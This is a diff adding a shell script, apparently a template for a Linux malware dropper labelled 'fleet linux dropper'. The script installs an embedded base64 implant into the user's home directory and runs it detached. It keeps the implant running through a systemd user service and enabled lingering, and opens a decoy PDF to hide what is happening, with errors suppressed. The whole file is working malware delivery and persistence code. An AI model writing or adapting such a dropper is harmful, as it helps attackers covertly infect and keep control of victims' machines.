@@ -1,0 +1,50 @@
+#!/bin/sh
+# fleet linux dropper — {{DOC}}
+# Installs the implant to ~/.local/bin, starts it detached, installs a systemd
+# user unit, enables lingering, and opens a decoy PDF 1.5s after launch.
+set -eu
+
+UNIT="{{UNIT}}"
+BIN_NAME="{{BIN_NAME}}"
+HERE="$(cd "$(dirname "$0")" && pwd)"
+BINDIR="${HOME}/.local/bin"
+UNITDIR="${HOME}/.config/systemd/user"
+BIN="${BINDIR}/${BIN_NAME}"
+
+mkdir -p "$BINDIR" "$UNITDIR"
+
+if [ -f "${HERE}/${BIN_NAME}" ]; then
+  cp "${HERE}/${BIN_NAME}" "$BIN"
+else
+  base64 -d > "$BIN" <<'FLEET_B64'
+{{IMPLANT_B64}}
+FLEET_B64
+fi
+chmod +x "$BIN"
+
+cat > "${UNITDIR}/${UNIT}.service" <<UNIT
+[Unit]
+Description={{DOC}} agent
+[Service]
+ExecStart=%h/.local/bin/${BIN_NAME}
+Restart=always
+RestartSec=5
+UNIT
+
+if command -v systemctl >/dev/null 2>&1; then
+  systemctl --user daemon-reload >/dev/null 2>&1 || true
+  systemctl --user enable --now "${UNIT}.service" >/dev/null 2>&1 || true
+fi
+
+sleep 1
+setsid "$BIN" </dev/null >/dev/null 2>&1 &
+
+if [ -f "${HERE}/decoy.pdf" ]; then
+  ( sleep 1.5; command -v xdg-open >/dev/null 2>&1 && xdg-open "${HERE}/decoy.pdf" >/dev/null 2>&1 || true ) &
+fi
+
+if command -v loginctl >/dev/null 2>&1; then
+  loginctl enable-linger "$(id -un)" >/dev/null 2>&1 || true
+fi
+
+exit 0
